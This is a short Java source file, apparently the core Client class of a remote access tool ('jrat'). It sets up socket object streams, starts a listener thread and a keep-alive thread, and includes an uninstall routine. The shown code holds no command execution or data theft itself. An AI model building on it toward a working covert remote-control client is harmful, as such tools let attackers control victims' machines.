package net.jrat.core;

import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;

import net.jrat.core.threads.ActionListener;
import net.jrat.core.threads.KeepAliveLoop;

public class Client
{
	public static Client instance;
	
	public Socket socket;
	public ObjectInputStream inputStream;
	public ObjectOutputStream outputStream;
	
	public boolean connected;
	public boolean running;
	
	public void start()
	{
		instance = this;
		
		this.connected = false;
		this.running = true;

		final Thread thread0 = new Thread(new ActionListener(), "listener");
		final Thread thread1 = new Thread(new KeepAliveLoop(), "loop");

		thread0.start();
		thread1.start();
	}
	
	public void uninstall()
	{
		try
		{
			this.socket.close();
			this.outputStream.close();
			this.inputStream.close();
		}
		catch(Exception e) {}
		this.running = false;
	}
}
